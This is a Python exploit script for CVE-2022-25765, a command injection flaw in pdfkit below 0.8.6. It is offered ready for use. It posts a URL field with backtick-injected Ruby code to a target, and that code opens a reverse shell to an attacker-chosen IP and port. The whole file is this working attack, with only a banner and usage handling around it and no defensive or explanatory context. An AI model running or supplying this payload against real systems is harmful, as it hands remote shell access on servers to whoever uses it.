import requests
import pyfiglet
import sys

def banner():
    print(pyfiglet.figlet_format("cve-2022-25765", font="slant"))
    print("[+] Exploit for CVE-2022-25765 command injection in pdfkit < 0.8.6")
    print("by GoAnalog14")

def exploit(url,ip,port):
    payload = f'http://%20`ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))\'`'
    data = {
    "url": payload
}
    resp = requests.post(url,data=data)
    print("[+] Shell spawned")

if __name__ == "__main__":
   
    if len(sys.argv) != 4:
        print("Usage: python3 ex1.py <url> <ip> <port>")
        sys.exit(1)

    banner()

    url = sys.argv[1]
    ip = sys.argv[2]
    port = sys.argv[3]
    
    resp = requests.get(url)

    if resp.status_code == 200:
        exploit(url,ip,port)
    else:
        print("Impossibile collegarsi al target")
